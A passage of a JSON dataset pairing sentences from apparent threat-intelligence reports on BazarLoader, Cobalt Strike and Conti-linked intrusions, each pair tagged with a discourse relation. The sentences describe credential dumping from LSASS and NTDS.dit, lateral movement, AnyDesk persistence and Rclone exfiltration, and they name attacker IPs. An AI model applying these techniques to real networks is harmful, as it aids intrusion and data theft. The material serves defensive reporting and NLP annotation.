    },
    {
        "S1": "The threat actors also executed PowerView Invoke-FindLocalAdminAccess module on one of the compromised servers:",
        "S2": "Decoded command:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Decoded command:",
        "S2": "We also saw exhaustive port scanners of certain servers before additional discovery.",
        "relation": "MISC"
    },
    {
        "S1": "We also saw exhaustive port scanners of certain servers before additional discovery.",
        "S2": "File and Directory Discovery",
        "relation": "MISC"
    },
    {
        "S1": "File and Directory Discovery",
        "S2": "The following discovery commands were run on all hosts including the Domain Controllers:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following discovery commands were run on all hosts including the Domain Controllers:",
        "S2": "The first Lateral Movement to the Domain Controller was performed using remote services creation (Executing spoolsv.exe via remote services):",
        "relation": "MISC"
    },
    {
        "S1": "The first Lateral Movement to the Domain Controller was performed using remote services creation (Executing spoolsv.exe via remote services):",
        "S2": "The spoolsv.exe binary is a Cobalt Strike artifact used for Lateral Movement and C2 which decodes to the configuration below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The spoolsv.exe binary is a Cobalt Strike artifact used for Lateral Movement and C2 which decodes to the configuration below:",
        "S2": "Additional Lateral Movement technique was observed, where the threat actors used Cobalt Strike\u2019s jump psexec_psh :",
        "relation": "ELABORATION"
    },
    {
        "S1": "Additional Lateral Movement technique was observed, where the threat actors used Cobalt Strike\u2019s jump psexec_psh :",
        "S2": "Using Cyberchef (recipe), we decoded the obfuscated powershell loader, which is using the default named pipe \\.\\pipe\\status_f5 :",
        "relation": "MISC"
    },
    {
        "S1": "Using Cyberchef (recipe), we decoded the obfuscated powershell loader, which is using the default named pipe \\.\\pipe\\status_f5 :",
        "S2": "Threat actors also pivoted to a domain controller by using the same Cobalt Strike artifacts, spoolsv.exe via remote service creation:",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors also pivoted to a domain controller by using the same Cobalt Strike artifacts, spoolsv.exe via remote service creation:",
        "S2": "Right after initial Lateral Movement, a second Cobalt Strike Beacon kaslose64.dll was executed on a critical server.",
        "relation": "MISC"
    },
    {
        "S1": "Right after initial Lateral Movement, a second Cobalt Strike Beacon kaslose64.dll was executed on a critical server.",
        "S2": "Rita stands for Real Intelligence Threat Analytics (RITA), developed by Active Countermeasures.",
        "relation": "MISC"
    },
    {
        "S1": "Rita stands for Real Intelligence Threat Analytics (RITA), developed by Active Countermeasures.",
        "S2": "Rita is a framework for identifying command and control communication, also known as beaconing.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Rita is a framework for identifying command and control communication, also known as beaconing.",
        "S2": "As the name implies, beaconing refers to delivering regular messages from an infected host to an attacker-controlled host.",
        "relation": "MISC"
    },
    {
        "S1": "As the name implies, beaconing refers to delivering regular messages from an infected host to an attacker-controlled host.",
        "S2": "Beacon is the malware agent installed on the victim\u2019s device and is responsible for communicating with the C2 server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Beacon is the malware agent installed on the victim\u2019s device and is responsible for communicating with the C2 server.",
        "S2": "Rita is consuming zeek/bro logs and detecting suspected beaconing activity using network traffic calculations.",
        "relation": "MISC"
    },
    {
        "S1": "Rita is consuming zeek/bro logs and detecting suspected beaconing activity using network traffic calculations.",
        "S2": "It then assigns a value ranging from 0.1 to 1.0, with the greater the score indicating that the network activity is suspicious.",
        "relation": "NEXT"
    },
    {
        "S1": "It then assigns a value ranging from 0.1 to 1.0, with the greater the score indicating that the network activity is suspicious.",
        "S2": "Rita is utilized as a hunting tool rather than a real-time detection tool, though simple scripting allows Rita to be used for live traffic analysis.",
        "relation": "MISC"
    },
    {
        "S1": "Rita is utilized as a hunting tool rather than a real-time detection tool, though simple scripting allows Rita to be used for live traffic analysis.",
        "S2": "However, analysts should add additional context and filter the results accordingly.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, analysts should add additional context and filter the results accordingly.",
        "S2": "Rita can only identify suspicious communication and should not be automated as a preventative control.",
        "relation": "MISC"
    },
    {
        "S1": "Rita can only identify suspicious communication and should not be automated as a preventative control.",
        "S2": "For more info on how RITA works check out the mathamatics here.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For more info on how RITA works check out the mathamatics here.",
        "S2": "Using with this case network traffic RITA was able to identify all active Beacons from the impacted hosts in the network as seen in the screenshot below:",
        "relation": "MISC"
    },
    {
        "S1": "Using with this case network traffic RITA was able to identify all active Beacons from the impacted hosts in the network as seen in the screenshot below:",
        "S2": "The following Cobalt Strike server was added to our Threat Feed on 07/26/2021.",
        "relation": "MISC"
    },
    {
        "S1": "The following Cobalt Strike server was added to our Threat Feed on 07/26/2021.",
        "S2": "This Cobalt Strike server was added to our Threat Feed on 07/27/2021.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This Cobalt Strike server was added to our Threat Feed on 07/27/2021.",
        "S2": "No exfiltration TTPs were observed while analyzing this intrusion, however, as stated in the case summary, it is possible that the threat actors used Cobalt Strike (encrypted channel) to transmit sensitive data such as Word documents.",
        "relation": "MISC"
    },
    {
        "S1": "No exfiltration TTPs were observed while analyzing this intrusion, however, as stated in the case summary, it is possible that the threat actors used Cobalt Strike (encrypted channel) to transmit sensitive data such as Word documents.",
        "S2": "The ransomware was executed on multiple servers using a batch script start.bat:",
        "relation": "MISC"
    },
    {
        "S1": "The ransomware was executed on multiple servers using a batch script start.bat:",
        "S2": "Here is the first ransomware execution which was observed on the Domain Controller:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here is the first ransomware execution which was observed on the Domain Controller:",
        "S2": "enter image description here",
        "relation": "ELABORATION"
    },
    {
        "S1": "enter image description here",
        "S2": "Below is another example of the ransomware execution on one of the external servers:",
        "relation": "MISC"
    },
    {
        "S1": "Below is another example of the ransomware execution on one of the external servers:",
        "S2": "enter image description here",
        "relation": "ELABORATION"
    },
    {
        "S1": "enter image description here",
        "S2": "Once the encryption process was complete a file called RecoveryManual.html was left across the filesystem with the instructions on how to contact the threat actors for the ransom negotiations.",
        "relation": "MISC"
    },
    {
        "S1": "In this case, we did not see the exact initial access vector but based on other reports at the time we assess with medium to high confidence a malicious email campaign delivering macro enabled Word documents was the delivery vector.",
        "S2": "Shortly after the initial BazarLoader execution, we observed the first discovery commands using the standard built in Microsoft utilities (net view, net group, nltest).",
        "relation": "NEXT"
    },
    {
        "S1": "Shortly after the initial BazarLoader execution, we observed the first discovery commands using the standard built in Microsoft utilities (net view, net group, nltest).",
        "S2": "We saw the BazarLoader process download and execute the first Cobalt Strike beacon twenty minutes later using rundll32.",
        "relation": "NEXT"
    },
    {
        "S1": "We saw the BazarLoader process download and execute the first Cobalt Strike beacon twenty minutes later using rundll32.",
        "S2": "As the operators tried to enumerate the network, they miss-typed a lot of their commands.",
        "relation": "MISC"
    },
    {
        "S1": "As the operators tried to enumerate the network, they miss-typed a lot of their commands.",
        "S2": "During interactive discovery tasks via the Cobalt Strike beacon, the threat actors attempted an unusual command that had us scratching our heads for awhile, \u201cav_query\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During interactive discovery tasks via the Cobalt Strike beacon, the threat actors attempted an unusual command that had us scratching our heads for awhile, \u201cav_query\u201d.",
        "S2": "This left us confused, we were not aware of the reason and/or the purpose of this command.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This left us confused, we were not aware of the reason and/or the purpose of this command.",
        "S2": "On August 5th, a threat actor that goes with the name \u201cm1Geelka\u201d, leaked multiple documents that contained instructions, tools and, \u201ctraining\u201d materials to be used by affiliates of Conti ransomware.",
        "relation": "MISC"
    },
    {
        "S1": "On August 5th, a threat actor that goes with the name \u201cm1Geelka\u201d, leaked multiple documents that contained instructions, tools and, \u201ctraining\u201d materials to be used by affiliates of Conti ransomware.",
        "S2": "We demonstrated some of the documents on one of our recent tweet threads, more info about the Conti leak here.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We demonstrated some of the documents on one of our recent tweet threads, more info about the Conti leak here.",
        "S2": "In these materials, we found a file called \u201cAVquery.cna\u201d that refers to a Cobalt Strike aggressor script for identifying AV on the target systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In these materials, we found a file called \u201cAVquery.cna\u201d that refers to a Cobalt Strike aggressor script for identifying AV on the target systems.",
        "S2": "It is likely that the threat actors in this intrusion meant to use this aggressor script via their Cobalt Strike console, but instead typed or pasted \u201cav_query\u201d into their windows command prompt session.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is likely that the threat actors in this intrusion meant to use this aggressor script via their Cobalt Strike console, but instead typed or pasted \u201cav_query\u201d into their windows command prompt session.",
        "S2": "Additionally, threat actors were seen following the instructions of the leaked documents step by step.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Additionally, threat actors were seen following the instructions of the leaked documents step by step.",
        "S2": "More specifically, we observed the threat actors copy/pasting the exact commands such as creating local admin users that contained the same passwords we saw in the leaked instructions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "More specifically, we observed the threat actors copy/pasting the exact commands such as creating local admin users that contained the same passwords we saw in the leaked instructions.",
        "S2": "Continuing with the discovery phase, the threat actors executed AdFind via a batch script before further enumerating using native Windows tools and port scanning via the Cobalt Strike beacon.",
        "relation": "MISC"
    },
    {
        "S1": "Continuing with the discovery phase, the threat actors executed AdFind via a batch script before further enumerating using native Windows tools and port scanning via the Cobalt Strike beacon.",
        "S2": "They then successfully escalated privileges by dumping credentials from the LSASS process.",
        "relation": "NEXT"
    },
    {
        "S1": "They then successfully escalated privileges by dumping credentials from the LSASS process.",
        "S2": "After having enough situational awareness over the domain and an administrator\u2019s account in their possession, operators used a reverse proxy and established a RDP connection on the beachhead host.",
        "relation": "NEXT"
    },
    {
        "S1": "After having enough situational awareness over the domain and an administrator\u2019s account in their possession, operators used a reverse proxy and established a RDP connection on the beachhead host.",
        "S2": "Moments later, we observed them move laterally for the first time to the Domain Controller using RDP.",
        "relation": "NEXT"
    },
    {
        "S1": "Moments later, we observed them move laterally for the first time to the Domain Controller using RDP.",
        "S2": "Once on the Domain Controller, they again downloaded and executed AdFind through the same batch script.",
        "relation": "NEXT"
    },
    {
        "S1": "Once on the Domain Controller, they again downloaded and executed AdFind through the same batch script.",
        "S2": "They also ran two separate Cobalt Strike beacons.",
        "relation": "LIST"
    },
    {
        "S1": "They also ran two separate Cobalt Strike beacons.",
        "S2": "As if their presence was not enough with Cobalt Strike and administrator credentials, they proceeded with creating two local administrator accounts.",
        "relation": "MISC"
    },
    {
        "S1": "As if their presence was not enough with Cobalt Strike and administrator credentials, they proceeded with creating two local administrator accounts.",
        "S2": "Next, they installed AnyDesk, a remote access application for RDP connectivity and remote system control.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, they installed AnyDesk, a remote access application for RDP connectivity and remote system control.",
        "S2": "After having four different types of persistence, they felt it was enough and continued enumerating the network, only this time, they searched for valuable documents across all domain-joined hosts.",
        "relation": "NEXT"
    },
    {
        "S1": "After having four different types of persistence, they felt it was enough and continued enumerating the network, only this time, they searched for valuable documents across all domain-joined hosts.",
        "S2": "To accomplish that, they used PowerSploit and, more specifically, the \u201cInvoke-ShareFinder\u201d module.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To accomplish that, they used PowerSploit and, more specifically, the \u201cInvoke-ShareFinder\u201d module.",
        "S2": "While waiting for their script to finish, the threat actors created a full backup of active directory in \u201cIFM\u201d media mode and dumped the password hashes along with the corresponding users.",
        "relation": "NEXT"
    },
    {
        "S1": "While waiting for their script to finish, the threat actors created a full backup of active directory in \u201cIFM\u201d media mode and dumped the password hashes along with the corresponding users.",
        "S2": "This method is both stealthier and safer for extracting the hashes from active directory, as explained by Black Hills Information Security.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This method is both stealthier and safer for extracting the hashes from active directory, as explained by Black Hills Information Security.",
        "S2": "The next step for the threat actors was to download and run \u201cAdvanced IP Scanner\u201d and scanned for ranges looking for other active subnets on the LAN.",
        "relation": "MISC"
    },
    {
        "S1": "The next step for the threat actors was to download and run \u201cAdvanced IP Scanner\u201d and scanned for ranges looking for other active subnets on the LAN.",
        "S2": "After four hours of downtime, the operators returned to the network and did something unexpected; they used seatbelt to enumerate the domain controller further.",
        "relation": "NEXT"
    },
    {
        "S1": "After four hours of downtime, the operators returned to the network and did something unexpected; they used seatbelt to enumerate the domain controller further.",
        "S2": "They then pivoted over to another domain controller, repeated all the above discovery steps, and ran the same tools as on the first domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "They then pivoted over to another domain controller, repeated all the above discovery steps, and ran the same tools as on the first domain controller.",
        "S2": "Eventually, this intrusion ended on the third day from the initial BazarLoader execution.",
        "relation": "NEXT"
    },
    {
        "S1": "Eventually, this intrusion ended on the third day from the initial BazarLoader execution.",
        "S2": "After almost a day of inactivity, the operators logged into the network and used RDP to remote into file servers that contained valuable data.",
        "relation": "MISC"
    },
    {
        "S1": "After almost a day of inactivity, the operators logged into the network and used RDP to remote into file servers that contained valuable data.",
        "S2": "They then created a directory called Shares$ and used Rclone to exfiltrate the data to the Mega Fileshare service.",
        "relation": "NEXT"
    },
    {
        "S1": "They then created a directory called Shares$ and used Rclone to exfiltrate the data to the Mega Fileshare service.",
        "S2": "Typically, these types of cases end up with Conti ransomware, however, the threat actors were evicted from the network before a final suspected ransomware deployment commenced.",
        "relation": "NEXT"
    },
    {
        "S1": "Typically, these types of cases end up with Conti ransomware, however, the threat actors were evicted from the network before a final suspected ransomware deployment commenced.",
        "S2": "We assess with medium to high confidence that the initial access was a result of malicious, macro-enabled, Word document that was sent as an attachment to the targets of a phishing campaign.",
        "relation": "MISC"
    },
    {
        "S1": "We assess with medium to high confidence that the initial access was a result of malicious, macro-enabled, Word document that was sent as an attachment to the targets of a phishing campaign.",
        "S2": "Brad reported on similar BazarLoader activity initiated from malicious TA551 Word Doc email campaign that resulted in Cobalt Strike beacons.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Brad reported on similar BazarLoader activity initiated from malicious TA551 Word Doc email campaign that resulted in Cobalt Strike beacons.",
        "S2": "The initial execution for this intrusion took place with the use of BazarLoader malware via rundll32.",
        "relation": "NEXT"
    },
    {
        "S1": "The initial execution for this intrusion took place with the use of BazarLoader malware via rundll32.",
        "S2": "Immediately after the execution, the malware contacted two of its C2 IPs:",
        "relation": "NEXT"
    },
    {
        "S1": "Immediately after the execution, the malware contacted two of its C2 IPs:",
        "S2": "We then observed the threat actor using the BazarLoader injected process, svchost.exe, to download Cobalt Strike and save it under:",
        "relation": "NEXT"
    },
    {
        "S1": "We then observed the threat actor using the BazarLoader injected process, svchost.exe, to download Cobalt Strike and save it under:",
        "S2": "before executing it using rundll32.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "before executing it using rundll32.exe.",
        "S2": "Throughout the intrusion, the threat actors utilized Cobalt Strike beacons and PowerShell to execute their payloads prior to interactively remoting into hosts using RDP and AnyDesk.",
        "relation": "MISC"
    },
    {
        "S1": "Throughout the intrusion, the threat actors utilized Cobalt Strike beacons and PowerShell to execute their payloads prior to interactively remoting into hosts using RDP and AnyDesk.",
        "S2": "The threat actors created two local user accounts on the first Domain Controller.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors created two local user accounts on the first Domain Controller.",
        "S2": "They also added one of the two to the local administrators group.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They also added one of the two to the local administrators group.",
        "S2": "The passwords that they used were the same as the passwords of the recent Conti leaked documents.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The passwords that they used were the same as the passwords of the recent Conti leaked documents.",
        "S2": "Screenshot from leaked Conti data (\u201c\u0417\u0430\u043a\u0440\u0435\u043f\\ AnyDesk.txt\u201d) (our tweet thread on Conti leak manuals):",
        "relation": "ELABORATION"
    },
    {
        "S1": "Screenshot from leaked Conti data (\u201c\u0417\u0430\u043a\u0440\u0435\u043f\\ AnyDesk.txt\u201d) (our tweet thread on Conti leak manuals):",
        "S2": "Commands from the intrusion:",
        "relation": "MISC"
    },
    {
        "S1": "Commands from the intrusion:",
        "S2": "AnyDesk was also installed on the main domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "AnyDesk was also installed on the main domain controller.",
        "S2": "The threat actors maintained an open communication channel through AnyDesk for a period of 11 hours.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors maintained an open communication channel through AnyDesk for a period of 11 hours.",
        "S2": "The threat actor was seen logging in from 185.220.100.242 (Tor Exit Node) using AnyDesk.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor was seen logging in from 185.220.100.242 (Tor Exit Node) using AnyDesk.",
        "S2": "Client ID 776934005. (ad_svc.trace)",
        "relation": "ELABORATION"
    },
    {
        "S1": "Client ID 776934005. (ad_svc.trace)",
        "S2": "The threat actors accessed credentials for an administrator account from the LSASS process using the Cobalt Strike beacon.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors accessed credentials for an administrator account from the LSASS process using the Cobalt Strike beacon.",
        "S2": "On the image below, we can see that the CS beacon process is injected into LSASS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the image below, we can see that the CS beacon process is injected into LSASS.",
        "S2": "Throughout the intrusion, we observed multiple instances of process injection from both the initial BazarLoader malware and Cobalt Strike beacons.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Throughout the intrusion, we observed multiple instances of process injection from both the initial BazarLoader malware and Cobalt Strike beacons.",
        "S2": "After BazarLoader was loaded in memory, almost immediately it injected into svchost.exe process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After BazarLoader was loaded in memory, almost immediately it injected into svchost.exe process.",
        "S2": "Additionally, the Cobalt Strike beacon was injected into mstsc.exe, searchindexer.exe and rundll32.exe and run various tasks from these processes.",
        "relation": "LIST"
    },
    {
        "S1": "Additionally, the Cobalt Strike beacon was injected into mstsc.exe, searchindexer.exe and rundll32.exe and run various tasks from these processes.",
        "S2": "The LSASS process was accessed by an unusual process \u201csearchindexer.exe\u201d on beachhead right before the lateral movement was observed.",
        "relation": "MISC"
    },
    {
        "S1": "The LSASS process was accessed by an unusual process \u201csearchindexer.exe\u201d on beachhead right before the lateral movement was observed.",
        "S2": "Searchindexer.exe is a legitimate Windows process responsible for the indexing of files or Windows searches.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Searchindexer.exe is a legitimate Windows process responsible for the indexing of files or Windows searches.",
        "S2": "This technique is known to be used by Cobaltstrike which inject malicious code into a newly spawned searchindexer process to evade detection.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This technique is known to be used by Cobaltstrike which inject malicious code into a newly spawned searchindexer process to evade detection.",
        "S2": "This is associated with MITRE ATT&CK (r) Tactic(s): Defense Evasion and Technique(s): T1036.004.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is associated with MITRE ATT&CK (r) Tactic(s): Defense Evasion and Technique(s): T1036.004.",
        "S2": "The Sysmon logs captured in our case below can be used to detect this type of activity.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Sysmon logs captured in our case below can be used to detect this type of activity.",
        "S2": "The threat actors created a full backup of the active directory in \u201cIFM\u201d media mode and dumped the password hashes along with the corresponding users.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors created a full backup of the active directory in \u201cIFM\u201d media mode and dumped the password hashes along with the corresponding users.",
        "S2": "They also employed the NtdsAudit tool immediately after using NTDSutil to dump the password hashes of all domain users.",
        "relation": "NEXT"
    },
    {
        "S1": "They also employed the NtdsAudit tool immediately after using NTDSutil to dump the password hashes of all domain users.",
        "S2": "NtdsAudit requires the \u201cntds.dit\u201d database file and SYSTEM registry file for extracting the password hashes and usernames.",
        "relation": "ELABORATION"
    },
    {
        "S1": "NtdsAudit requires the \u201cntds.dit\u201d database file and SYSTEM registry file for extracting the password hashes and usernames.",
        "S2": "After providing these as arguments, they exported the password hashes in a file that they named \u201cpwdump.txt\u201d and the user details in a csv file called \u201cusers.csv\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "After providing these as arguments, they exported the password hashes in a file that they named \u201cpwdump.txt\u201d and the user details in a csv file called \u201cusers.csv\u201d.",
        "S2": "After obtaining the password hashes, the threat actors can crack the passwords hashes using a program such as hashcat.",
        "relation": "NEXT"
    },
    {
        "S1": "After obtaining the password hashes, the threat actors can crack the passwords hashes using a program such as hashcat.",
        "S2": "A few minutes after the initial execution, BazarLoader ran some discovery tasks using the built in Microsoft net and nltest utilities and transferred the results over the C2 channel.",
        "relation": "MISC"
    },
    {
        "S1": "A few minutes after the initial execution, BazarLoader ran some discovery tasks using the built in Microsoft net and nltest utilities and transferred the results over the C2 channel.",
        "S2": "Later on, hands-on operators carried out some additional network and domain reconnaissance from the Cobalt Strike beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "Later on, hands-on operators carried out some additional network and domain reconnaissance from the Cobalt Strike beacon.",
        "S2": "Again, built in utilities were favored, with the exception of what we assess was a fat finger or miss-paste by the threat actor entering a command they meant to execute in their Cobalt Strike console into the windows command terminal.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Again, built in utilities were favored, with the exception of what we assess was a fat finger or miss-paste by the threat actor entering a command they meant to execute in their Cobalt Strike console into the windows command terminal.",
        "S2": "The threat actors executed AdFind multiple times on both the beachhead and the domain controllers through a well-known script called adf.bat.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors executed AdFind multiple times on both the beachhead and the domain controllers through a well-known script called adf.bat.",
        "S2": "Later on, during the first day of the intrusion, and before we saw the threat actors pivot laterally to the domain controller, they ensured the information that they had collected was accurate by running the below enumeration commands:",
        "relation": "MISC"
    },
    {
        "S1": "Later on, during the first day of the intrusion, and before we saw the threat actors pivot laterally to the domain controller, they ensured the information that they had collected was accurate by running the below enumeration commands:",
        "S2": "Threat actor dropped and ran a script named ping.bat.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actor dropped and ran a script named ping.bat.",
        "S2": "Here\u2019s an example:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here\u2019s an example:",
        "S2": "The threat actors utilized Advanced IP Scanner to the scan for open ports.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors utilized Advanced IP Scanner to the scan for open ports.",
        "S2": "One of the first things that the attackers did once on the first domain controller, was to execute Invoke-ShareFinder from PowerSploit via PowerShell ISE.",
        "relation": "MISC"
    },
    {
        "S1": "One of the first things that the attackers did once on the first domain controller, was to execute Invoke-ShareFinder from PowerSploit via PowerShell ISE.",
        "S2": "They did the same thing later, on the second domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "They did the same thing later, on the second domain controller.",
        "S2": "Other Microsoft AD management PowerShell administration modules were also invoked by the threat actors for discovery tasks.",
        "relation": "MISC"
    },
    {
        "S1": "Other Microsoft AD management PowerShell administration modules were also invoked by the threat actors for discovery tasks.",
        "S2": "Get-ADDomainController Get-ADDomainController -Filter * | ft Get-ADComputer -Filter * -Properties * | Get-Member Get-ADDomain",
        "relation": "ELABORATION"
    },
    {
        "S1": "Get-ADDomainController Get-ADDomainController -Filter * | ft Get-ADComputer -Filter * -Properties * | Get-Member Get-ADDomain",
        "S2": "From the Domain Controller the threat actor also ran a Seatbelt binary, which was also seen in the Conti leak documents.",
        "relation": "MISC"
    },
    {
        "S1": "From the Domain Controller the threat actor also ran a Seatbelt binary, which was also seen in the Conti leak documents.",
        "S2": "This utility contains a number of \u201csafety checks\u201d on a host, telling the user about things like installed AV, network drives, local users, and much more.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This utility contains a number of \u201csafety checks\u201d on a host, telling the user about things like installed AV, network drives, local users, and much more.",
        "S2": "We also noticed the threat actors searching for any existing antivirus software on the domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "We also noticed the threat actors searching for any existing antivirus software on the domain controller.",
        "S2": "They ran \u201cdir\u201d on the \u201cc:\\Program Files\\\u201d folder and saved the findings in the AV.txt file using a script named av.bat The script looked similar to the below:",
        "relation": "NEXT"
    },
    {
        "S1": "They ran \u201cdir\u201d on the \u201cc:\\Program Files\\\u201d folder and saved the findings in the AV.txt file using a script named av.bat The script looked similar to the below:",
        "S2": "Many hours after the initial compromise, we observed the threat actors using RDP to connect to the first domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "Many hours after the initial compromise, we observed the threat actors using RDP to connect to the first domain controller.",
        "S2": "They used reverse proxy via the Cobalt Strike C2 to initiate the RDP connection and for that reason, the operator\u2019s real hostname was captured in event ID 4624:",
        "relation": "ELABORATION"
    },
    {
        "S1": "They used reverse proxy via the Cobalt Strike C2 to initiate the RDP connection and for that reason, the operator\u2019s real hostname was captured in event ID 4624:",
        "S2": "Prior to exfiltrating the data, operators staged them under a directory called \u201cShares\u201d on each file server.",
        "relation": "MISC"
    },
    {
        "S1": "Prior to exfiltrating the data, operators staged them under a directory called \u201cShares\u201d on each file server.",
        "S2": "They then inspected the documents they collected prior to exfiltrating them over to Mega storage servers using the Rclone application.",
        "relation": "NEXT"
    },
    {
        "S1": "They then inspected the documents they collected prior to exfiltrating them over to Mega storage servers using the Rclone application.",
        "S2": "BazarLoader initial communication with the C2 is over HTTPS.",
        "relation": "MISC"
    },
    {
        "S1": "BazarLoader initial communication with the C2 is over HTTPS.",
        "S2": "Data is sent to the C2 via the cookie parameter(screenshot taken from https://tria.ge/210716-v4jh8hf6ea/behavioral2).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Data is sent to the C2 via the cookie parameter(screenshot taken from https://tria.ge/210716-v4jh8hf6ea/behavioral2).",
        "S2": "Twenty minutes after the initial execution, BazarLoader downloaded and executed Cobalt Strike beacon with the help of rundll32.exe.",
        "relation": "MISC"
    },
    {
        "S1": "Twenty minutes after the initial execution, BazarLoader downloaded and executed Cobalt Strike beacon with the help of rundll32.exe.",
        "S2": "The AnyDesk software installed by the threat actors maintained a constant connection to the Anydesk infrastructure for the duration of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The AnyDesk software installed by the threat actors maintained a constant connection to the Anydesk infrastructure for the duration of the intrusion.",
        "S2": "Some network oddities appeared several times during the course of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "Some network oddities appeared several times during the course of the intrusion.",
        "S2": "One of those oddities was several connections across the intrusion to an XMPP chat server at chatterboxtown.us at 70.35.205.161.",
        "relation": "ELABORATION"
    },
    {
        "S1": "One of those oddities was several connections across the intrusion to an XMPP chat server at chatterboxtown.us at 70.35.205.161.",
        "S2": "These connections originated from one of the Cobalt Strike processes over port 5222.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These connections originated from one of the Cobalt Strike processes over port 5222.",
        "S2": "The goal of this traffic was not discovered in the course of the investigation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The goal of this traffic was not discovered in the course of the investigation.",
        "S2": "Another, was a brief SSH connection to a server on the internet using Putty.",
        "relation": "MISC"
    },
    {
        "S1": "Another, was a brief SSH connection to a server on the internet using Putty.",
        "S2": "The connection took place for a period of twenty minutes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The connection took place for a period of twenty minutes.",
        "S2": "The reason for this connection is unknown.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The reason for this connection is unknown.",
        "S2": "According to public records, the IP is associated with an old Cobalt Strike C2 server.",
        "relation": "MISC"
    },
    {
        "S1": "According to public records, the IP is associated with an old Cobalt Strike C2 server.",
        "S2": "As the threat actors were perusing files, we received a notification that one of our files had been remotely opened from 46.38.235.14.",
        "relation": "MISC"
    },
    {
        "S1": "As the threat actors were perusing files, we received a notification that one of our files had been remotely opened from 46.38.235.14.",
        "S2": "The threat actors later exfiltrated sensitive documents from domain joined file servers using the Rclone application.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors later exfiltrated sensitive documents from domain joined file servers using the Rclone application.",
        "S2": "The destination of the exfiltrated data was Mega.io.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The destination of the exfiltrated data was Mega.io.",
        "S2": "The above command was copied and pasted by the threat actors to exfiltrate the data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The above command was copied and pasted by the threat actors to exfiltrate the data.",
        "S2": "Prior to the correct command, the threat actors accidentally pasted a command from a previous intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Prior to the correct command, the threat actors accidentally pasted a command from a previous intrusion.",
        "S2": "That command contained a different victim organization in the arguments showing through out the intrusion continued sloppiness of the threat actor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "That command contained a different victim organization in the arguments showing through out the intrusion continued sloppiness of the threat actor.",
        "S2": "Breaking down the Rclone command line arguments:",
        "relation": "MISC"
    },
    {
        "S1": "Breaking down the Rclone command line arguments:",
        "S2": "A great reference for detecting Rclone data exfiltration is the article from nccgroup: Detecting Rclone \u2013 An Effective Tool for Exfiltration \u2013 and from Red Canary \u2013 Transferring Leverage in a Ransomware Attack.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A great reference for detecting Rclone data exfiltration is the article from nccgroup: Detecting Rclone \u2013 An Effective Tool for Exfiltration \u2013 and from Red Canary \u2013 Transferring Leverage in a Ransomware Attack.",
        "S2": "Multiple sensitive files were exfiltrated but before the threat actors could take any further action inside the network, they were evicted from the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Multiple sensitive files were exfiltrated but before the threat actors could take any further action inside the network, they were evicted from the network.",
        "S2": "BazarLoader infections currently tend to materialize into Conti ransomware, and many of the TTP\u2019s of the infection mimic the instructions from the leaked Conti manual.",
        "relation": "MISC"
    },
    {
        "S1": "BazarLoader infections currently tend to materialize into Conti ransomware, and many of the TTP\u2019s of the infection mimic the instructions from the leaked Conti manual.",
        "S2": "Information posted from @AltShiftPrtScn based on an IR engagement where the threat actors already had domain admin on the network two months prior meeting their final objectives.",
        "relation": "MISC"
    },
    {
        "S1": "BazarLoader has continued to be one of the preeminent initial access brokers for ransomware threat actor access.",
